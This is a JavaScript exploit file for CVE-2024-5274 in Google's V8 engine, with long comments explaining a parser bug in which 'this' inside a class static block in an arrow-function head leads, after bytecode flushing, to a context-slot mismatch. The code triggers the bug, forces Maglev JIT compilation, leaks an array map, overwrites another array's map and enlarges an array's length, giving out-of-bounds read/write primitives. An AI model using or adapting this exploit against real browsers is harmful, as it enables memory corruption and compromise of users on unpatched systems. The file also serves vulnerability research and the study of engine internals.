// Exploit for CVE-2024-5274
// authors: @mistymntncop, @buptsb
// Shoutout to @buptsb for his major contribution of discovering 
// both the DCHECK bytecode mismatch POC and then discovering 
// how to elevate that primitive to more powerful OOB read/write primitives.
// Without him this exploit would not be possible :-)
//
// based on the ITW exploit (author unknown) found by @_clem1, @btiszka
//
// Build d8 using:
// a) Update sources
//    git checkout bf4298bafd04910c2cd634738ae73f4a4151b47d
//    gclient sync 
//
// b) Compile
//
//    Debug Build:
//    py ./tools/dev/gm.py x64.debug
//
//    Release Build:
//    py ./tools/dev/gm.py x64.release
//

var conv_ab = new ArrayBuffer(8);
var conv_f64 = new Float64Array(conv_ab);
var conv_b64 = new BigInt64Array(conv_ab);

function dtoi(d) {
    conv_f64[0] = d;
    return conv_b64[0];
}

function itod(i) {
    conv_b64[0] = i;
    return conv_f64[0];
}

function smi(val) {
    return val << 1n;
}


function gc_minor() { //scavenge
    for(let i = 0; i < 1000; i++) {
        new ArrayBuffer(0x10000);
    }
}

function gc_major() { //mark-sweep
    new ArrayBuffer(0x7FE00000);
}

//@ajxchapman's brilliant JIT detection oracle
//https://x.com/ajxchapman/status/1800490112364753323
//detects whether a function has been MAGLEV jitted
//See @rls1004's writeup for an explanation.
//https://rls1004.github.io/2024-06-13-journey-of-v8-call-stack-overflow-with-maglev/
//TODO: may not be totally correct as I think the target JIT
//function has to be the root of the recursion...
function jit_garanteed(fun) {
    let result = false;
    
    let counter = 0;
    
    let recurse = () => {
        counter++;
        recurse();
    }
    
    let test = (fun) => {
        counter = 0;
        try {
            fun(false);
        } catch(err) {
        }
        return counter;
    }
    
    let last_depth = 0;
    for(let i = 0; i < 20000; i++) {
        if(i % 410 == 0) {
            let depth = test(recurse);
            
            if(last_depth != 0 && depth != last_depth) {
                %GlobalPrint("JITTED! " + depth + ", " + last_depth + "\n");
                result = true;
                break;
            }
            last_depth = depth;
        } else {
            test(fun);
        }
    }
    return result;
}

function flush_bytecode() {
    //Please change to be the "bytecode_old_age" value from ./src/flags/flag-definitions.h
    //You can observe if this is working by passing the "--trace-flush-code" flag.
    //If "--trace-flush-code" is absent please use the "--trace-gc" flag instead.
    const bytecode_old_age = 6;
    for(let i = 0; i < (bytecode_old_age+1); i++) {
        //doesn't seem to matter if the allocation fails
        try {
            gc_major();
        } catch(err) {
        }
    }
}

function store(arr, key, val) {
    arr[key] = val;
}

//install feedback vector for store
//%EnsureFeedbackVectorForFunction(store);
const IC_INSTALL_COUNT = 9;
for(let i = 0; i < IC_INSTALL_COUNT; i++) {
    store([0], 0, 0);
}
//seed store IC with handler for double array map
store([1.1], 0, 1.1);

var arr1 = null;
var arr2 = null;
var arr3 = null;

//Working theory! (May be subject to error)
//
//Parsing in V8 explained
//https://docs.google.com/document/d/1dev8h3FtP-BDjcwQosanV9wGy3NyOOpQe3tAIDr7hXc/edit


//https://developer.mozilla.org/en-US/docs/Web/JavaScript/Closures
//
//"A closure is the combination of a function bundled together (enclosed) with references to its surrounding 
//state (the lexical environment). In other words, a closure gives you access to an outer function's scope from 
//an inner function."
//
//function outer() {
//    let a = 123;
//    function inner() {
//        return a;
//    }
//    return inner;
//}
//
//https://v8.dev/blog/preparser
//
//"for each variable declared in a function, we need to know whether an inner function references 
//the variable, so we can decide whether to allocate the variable on the stack or in a heap-allocated context."
//
//Variables declared in functions usually have stack lifetimes. Any variable declared in outer that is referenced 
//by the inner function must be allocated somewhere other than the stack as the lifetime of inner outlives that of outer.
//In V8 these variables are stored in a structure called a Context. A Context is basically an array which stores these 
//variables. The first 2 (Context::MIN_CONTEXT_SLOTS) slots of the array are reserved for internal parser values.
//
//
//The 'this' variable is a special implicit variable. 
//
//https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this
//
//"The this keyword refers to the context where a piece of code, such as a function's body, is supposed to run. 
//Most typically, it is used in object methods, where this refers to the object that the method is attached to, 
//thus allowing the same method to be reused on different objects."
//
//"Arrow functions differ in their handling of this: they inherit this from the parent scope at the time they are defined."
//
//Because arrow functions inherit the 'this' variable from the parent scope, the 'this' variable must be recorded within
//the context structure.
//
//
//The vuln allows us to set the "ForceContextAllocation" flag on the "this" variable without also setting the "IsUsed" flag.
//The "ForceContextAllocation" flag is used for the allocation of a variable within a context slot.
//This is an invalid contradictory state for a variable to be in as implicitly for a variable to be context allocated it
//also has to be used.
//
//We trigger the vuln by placing 'this' inside a class static block within an arrow function head.
//
//Vuln POC trigger:
//    (arg = class foo {
//        static {
//            this;
//        }
//    }) => { }
//
//v8::internal::ArrowHeadParsingScope<v8::internal::ParserTypes<v8::internal::PreParser> >::RecordThisUse <-- sets "uses_this_" to true for the arrow parsing scope
//v8::internal::ExpressionScope<v8::internal::ParserTypes<v8::internal::Parser> >::RecordThisUse          <-- iterates through scope chain applying RecordThisUse on all ArrowHeadParsingScope's 
//v8::internal::ParserBase<v8::internal::Parser>::UseThis
//v8::internal::Parser::NewThisExpression
//v8::internal::ParserBase<v8::internal::Parser>::ParsePrimaryExpression
//...
//v8::internal::ParserBase<v8::internal::Parser>::ParseClassStaticBlock
//...
//v8::internal::ParserBase<v8::internal::Parser>::ParseFunctionBody
//v8::internal::Parser::ParseFunction


//Later on the ValidateAndCreateScope function calls DeclarationScope::UsesThis which forces context allocation of the 'this' variable (receiver).
//This puts the 'this' variable in the contradictory state of being both context allocated and unused.

//v8::internal::Variable::ForceContextAllocation
//v8::internal::DeclarationScope::UsesThis
//v8::internal::ArrowHeadParsingScope<v8::internal::ParserTypes<v8::internal::Parser> >::ValidateAndCreateScope <-- checks "uses_this_"
//v8::internal::ParserBase<v8::internal::Parser>::ParsePrimaryExpression
//...
//v8::internal::ParserBase<v8::internal::Parser>::ParseFunctionBody
//v8::internal::Parser::ParseFunction



//This inconsistency becomes a problem when we consider the lazy parsing feature.
//Lazy parsing is a parsing technique of only fully parsing functions on-demand when they are actually used.
//
// https://v8.dev/blog/preparser
//"Instead of generating an abstract syntax tree (AST) for each function and then compiling it to bytecode, 
//the parser can decide to “pre-parse” functions it encounters instead of fully parsing them. It does so by 
//switching to the preparser, a copy of the parser that does the bare minimum needed to be able to otherwise 
//skip over the function. The preparser verifies that the functions it skips are syntactically valid, and 
//produces all the information needed for the outer functions to be compiled correctly. When a preparsed 
//function is later called, it is fully parsed and compiled on-demand."
//
//Pre-parsing tracks variable declarations and references. Apparently this is for enforcing syntax correctness.
//"E.g., if a variable is twice declared as a lexical variable in the same scope"
//
//Namely the following flags are calculated for each variable:
//  - is_used
//  - maybe_assigned
//  - has_forced_context_allocation
//
//This becomes relevant as variable data parsed during pre-parsing is saved and is later restored during full parsing. 
//Whether this pre-parser variable data is used by the parser is determined by the must_use_preparsed_scope_data_ value.
//
//void PreparseDataBuilder::SaveDataForVariable(Variable* var) {
//  uint8_t variable_data = VariableMaybeAssignedField::encode(
//                              var->maybe_assigned() == kMaybeAssigned) |
//                          VariableContextAllocatedField::encode(         <-- only serializes "ForceContextAllocation" flag but not the "IsUsed" flag!
//                              var->has_forced_context_allocation());
//  byte_data_.Reserve(kUint8Size);
//  byte_data_.WriteQuarter(variable_data);
//}
//
//v8::internal::PreparseDataBuilder::SaveDataForVariable
//v8::internal::PreparseDataBuilder::SaveDataForScope
//v8::internal::PreparseDataBuilder::SaveScopeAllocationData
//v8::internal::DeclarationScope::SavePreparseDataForDeclarationScope
//v8::internal::Scope::SavePreparseData::<lambda_1>::operator()
//v8::internal::Scope::ForEach<lambda>
//v8::internal::Scope::SavePreparseData
//v8::internal::DeclarationScope::AnalyzePartially
//v8::internal::Parser::SkipFunction
//v8::internal::Parser::ParseFunctionLiteral
//...
//
//
//Before bytecode flushing. must_use_preparsed_scope_data_ = true
//
//Any context allocated variable restored from preparsing will have both the "IsUsed" and "ForceContextAllocation"
//flags set. This is regardless of whether the "IsUsed" flag was actually set as it is assumed that they are both set 
//in unison (The vuln allows us to break this invariant).
//
//
//template <typename Data>
//void BaseConsumedPreparseData<Data>::RestoreDataForVariable(Variable* var) {
//  uint8_t variable_data = scope_data_->ReadQuarter();
//  if (VariableMaybeAssignedField::decode(variable_data)) {
//    var->SetMaybeAssigned();
//  }
//  if (VariableContextAllocatedField::decode(variable_data)) {
//    var->set_is_used();                             <-- Normally this is fine. Set erroneously in the case of our vuln
//    var->ForceContextAllocation();
//  }
//}
//
//v8::internal::BaseConsumedPreparseData<v8::internal::Tagged<v8::internal::PreparseData> >::RestoreDataForVariable
//v8::internal::BaseConsumedPreparseData<v8::internal::Tagged<v8::internal::PreparseData> >::RestoreDataForScope
//v8::internal::BaseConsumedPreparseData<v8::internal::Tagged<v8::internal::PreparseData> >::RestoreScopeAllocationData
//v8::internal::DeclarationScope::Analyze
//v8::internal::Parser::PostProcessParseResult
//v8::internal::Parser::ParseFunction
//...
//
//
//
//These flags are important in that they are used to determine whether storage for a variable should be 
//allocated (MustAllocate) and where that variable should be allocated from (MustAllocateInContext).
//
//void DeclarationScope::AllocateParameter(Variable* var, int index) {
//  if (!MustAllocate(var)) return;                                          <-- checks the "IsUsed" flag
//  if (has_forced_context_allocation_for_parameters() ||
//      MustAllocateInContext(var)) {                                        <-- checks the "ForceContextAllocation" flag
//    DCHECK(var->IsUnallocated() || var->IsContextSlot());
//    if (var->IsUnallocated()) AllocateHeapSlot(var);
//  } else {
//    DCHECK(var->IsUnallocated() || var->IsParameter());
//    if (var->IsUnallocated()) {
//      var->AllocateTo(VariableLocation::PARAMETER, index);
//    }
//  }
//}
//v8::internal::Scope::MustAllocate
//v8::internal::DeclarationScope::AllocateParameter
//v8::internal::DeclarationScope::AllocateReceiver
//v8::internal::Scope::AllocateVariablesRecursively::<lambda_4>::operator()
//v8::internal::Scope::ForEach<lambda>
//v8::internal::Scope::AllocateVariablesRecursively
//v8::internal::DeclarationScope::AllocateVariables
//v8::internal::DeclarationScope::Analyze
//v8::internal::Parser::PostProcessParseResult<v8::internal::Isolate>
//v8::internal::Parser::ParseFunction
//...
//
//The slot location of a particular variable is determined by "num_heap_slots_" value.
//
//void Scope::AllocateHeapSlot(Variable* var) {
//  var->AllocateTo(VariableLocation::CONTEXT, num_heap_slots_++);
//}
//
//
//https://v8.dev/blog/v8-lite
//
//Bytecode flushing is the technique of heuristically throwing away bytecode arrays that haven't been used for a while.
//More precisely they are thrown away after a number of garbage collection events (the exact number defined in the 
//"bytecode_old_age" value from ./src/flags/flag-definitions.h)
//
//By triggering bytecode flushing we can cause the complete reparsing of the target function. This time when parsed
//the must_use_preparsed_scope_data_ variable will be false and the variable pre-parse data will not be restored via
//RestoreDataForVariable. Instead no context slot will be allocated for the 'this' variable as the "IsUsed" flag remains
//false. This leads to a bytecode mismatch before and after bytecode flushing. No corresponding StaCurrentContextSlot
//bytecode instruction will be emmitted for the 'this' variable. The CreateFunctionContext instruction will create a 
//context with one less user context slot. The number of slots created by CreateFunctionContext is determined by the 
//num_heap_slots_ value (CreateFunctionContext in BuildNewLocalActivationContext).
//
//After bytecode flushing. must_use_preparsed_scope_data_ = false
//
//  https://v8.dev/blog/preparser
//
//"To allow lazy compilation of functions (and to support the debugger), the context points to a metadata object 
//called ScopeInfo. ScopeInfo objects describe what variables are listed in a context. 
//This means that while compiling inner functions, we can compute where variables live in the context chain."
//
//While the total slot count for CreateFunctionContext is calculated based on the num_heap_slots_ value the 
//slot index used by Context load/store instructions is loaded from the ScopeInfo object saved from pre-parsing.
//This results in a OOB read/write primitive in the context structure as we have violated invariants using our
//bytecode mismatch primitive. We break idempotency by creating a Context (via CreateFunctionContext) with one less
//user context slot when we reparse after bytecode flushing. 
//
//
//v8::internal::ScopeInfo::InlinedLocalNamesLookup
//v8::internal::ScopeInfo::ContextSlotIndex
//v8::internal::Scope::LookupInScopeInfo                      <-- variable 'a' restored with wrong index from previous parse saved within ScopeInfo
//v8::internal::Scope::Lookup<kDeserializedScope>
//v8::internal::Scope::Lookup<kParsedScope>
//v8::internal::Scope::ResolveVariable
//v8::internal::Scope::ResolveVariablesRecursively
//v8::internal::DeclarationScope::AllocateVariables
//v8::internal::DeclarationScope::Analyze
//v8::internal::Parser::PostProcessParseResult<v8::internal::Isolate>
//v8::internal::Parser::ParseFunction
//
//---------------------------------------------------------
//  CreateFunctionContext <scope_info_idx> <slots> 
//
//CreateFunctionContext creates the Context.
//Confusingly <slots> refers to the number of user slots.
//There are 2 reserved slots (Context::MIN_CONTEXT_SLOTS).
//The total number of slots is computed as Context::MIN_CONTEXT_SLOTS + <slots> = 2 + <slots>
//Please note that the <slot_index> from both the LdaCurrentContextSlot/StaCurrentContextSlot
//instructions refers to the index of the total slots.
//
//---------------------------------------------------------
//  LdaCurrentContextSlot <slot_index>
//  LdaImmutableCurrentContextSlot <slot_index>
//
// Loads the variable from the context slot into the accumulator register
//
//---------------------------------------------------------
//  StaCurrentContextSlot <slot_index>
//
// Stores the variable from the accumulator register into the context slot
//
//---------------------------------------------------------
//  CreateClosure <index> <slot> <flags>
//
//  Creates a closure function 
//  <index> refers to the index of the function name within the constant pool.
//  <slot> refers to the Feedback slot and is unrelated to context slots.
//
//After bytecode flushing we observe a bytecode mismatch. (Pass "--print-bytecode" flag to observe).
//Notably the 'this' variable has dissapeared.

//before bytecode flushing                                                   //after bytecode flushing
   //  CreateFunctionContext [0], [2]   <-- allocates the function context     //  CreateFunctionContext [0], [1]   <-- allocates the function context 
   //  PushContext r2                       (2 user context slots)             //  PushContext r2                       (1 user context slot)
   //  Ldar <this>                                                             //  LdaTheHole
   //  StaCurrentContextSlot [2]        <-- 'this' variable                    //  StaCurrentContextSlot [2]        <-- 'a' variable
   //  LdaTheHole                                                              //  LdaGlobal [1], [0]
   //  StaCurrentContextSlot [3]        <-- 'a' variable                       //  Star3
   //  LdaGlobal [1], [0]                                                      //  LdaConstant [2]
   //  Star3                                                                   //  Star4
   //  LdaConstant [2]                                                         //  LdaConstant [3]
   //  Star4                                                                   //  Star5
   //  LdaConstant [3]                                                         //  Ldar r3
   //  Star5                                                                   //  Construct r3, r4-r5, [2]         <-- allocates 'arr1'
   //  Ldar r3                                                                 //  StaGlobal [4], [4]
   //  Construct r3, r4-r5, [2]         <-- allocates 'arr1'                   //  LdaSmi [123]
   //  StaGlobal [4], [4]                                                      //  StaCurrentContextSlot [2]        <-- 'a' variable
   //  LdaSmi [123]                                                            //  CreateClosure [5], [0], #2
   //  StaCurrentContextSlot [3]        <-- 'a' variable                       //  CreateClosure [6], [1], #2       <-- 'inner' function
   //  CreateClosure [5], [0], #2                                              //  Star1
   //  CreateClosure [6], [1], #2       <-- 'inner' function                   //  Star0
   //  Star1                                                                   //  Return
   //  Star0
   //  Return

function make_leak() {
    //Creates a PACKED_DOUBLE_ELEMENTS array
    //Use new operator instead of literal syntax to allocate the JSArray object before the element's FixedArray
    arr1 = new Array(1.1, 1.2);
    let a = 123;

    (arg = class foo {
        static {
            this;
        }
    }) => { }
    //We need this to move the CreateClosure instruction from after Construct
    //Putting a block around inner seems to achieve this. Without it 
    //CreateClosure will happen after CreateFunctionContext but before Construct.
    //This allows us to allocate the array after CreateClosure via Construct
    {
        //before and after bytecode flushing
            //  Ldar a0
            //  JumpIfToBooleanFalse [7]
            //  LdaImmutableCurrentContextSlot [3]      <-- 'a' variable - after bytecode flushing we access this OOB!!
            //  ThrowReferenceErrorIfHole [0]
            //  Return
            //  LdaUndefined
            //  Return
        
        //We will use the OOB read primitive to read the map of arr1
        function inner(b) {
            if(b) {
                return a;
            }
        };
    }
    return inner;
}

//Create a custom array so we have 10 in-object properties. See https://v8.dev/blog/slack-tracking for more details.
class MyArray extends Array { }
//Premptively allocate MyArray descriptor array so it doesn't interfere with subsequent allocations
new MyArray(); 


function make_oob_write() {
    //Creates a PACKED_SMI_ELEMENTS array
    arr2 = new Array(1,2,3,4,5,6,7,8,9,10,11,12,13,14,15);
    //We create a MyArray with 10 in-object properties so when we overwrite the JSArray length (32 bit) with a double (64 bit)
    //we don't also overwrite anything important.
    arr3 = new MyArray(1.1,1.1,1.1);
    let a = 123;

    (arg = class foo {
        static {
            this;
        }
    }) => { }
    //ditto as "make_leak"
    {
        //before and after bytecode flushing
            //  Ldar a0
            //  JumpIfToBooleanFalse [10]
            //  LdaCurrentContextSlot [3]
            //  ThrowReferenceErrorIfHole [0]
            //  Ldar a1
            //  StaCurrentContextSlot [3]              <-- 'a' variable - after bytecode flushing we write OOB!!
            //  LdaUndefined
            //  Return
            
        //We will use the OOB write primitive to overwrite the map of arr2
        function inner(b, x) {
            if(b) {
                a = x;
            }
        };
    }
    return inner;
}

function install_primitives() {
    //pre-parse and parse these functions when called
    let leak = make_leak();
    leak(false);
    let oob_write = make_oob_write();
    oob_write(false, 0);

    //%ForceFlush(make_leak);
    //%ForceFlush(leak);
    //%ForceFlush(make_oob_write);
    //%ForceFlush(oob_write);
    flush_bytecode();
    %GlobalPrint("BYTECODE FLUSHED ==============\n");

    //reparsed when we call
    leak = make_leak();
    oob_write = make_oob_write();
        
    //%PrepareFunctionForOptimization(leak);
    //leak(false);
    //%OptimizeMaglevOnNextCall(leak);
    //leak(false);

    //%PrepareFunctionForOptimization(oob_write);
    //oob_write(false, 0);
    //%OptimizeMaglevOnNextCall(oob_write);
    //oob_write(false, 0);

    //Need to JIT these functions with MAGLEV
    //because the slow interpreter path is bounds checked...
    jit_garanteed(leak);
    jit_garanteed(oob_write);

    //leak map of PACKED_DOUBLE_ELEMENTS array
    let dbl_arr_map = leak(true);

    //overwrite arr2 map with double map
    oob_write(true, dbl_arr_map);

    //We need to use the fast IC path to write 
    //the value to the array as the slow 
    //interpreter path seems to check the map of 
    //the elements FixedArray which we have not modified.
    let new_arr3_length = 16n;
    store(arr2, 9, itod(smi(new_arr3_length) | 0n << 32n));
    %DebugPrint(arr2);
    
    %GlobalPrint("==============\n");
    %DebugPrint(arr3);

    %DebugPrint(arr3[15]);
}
install_primitives();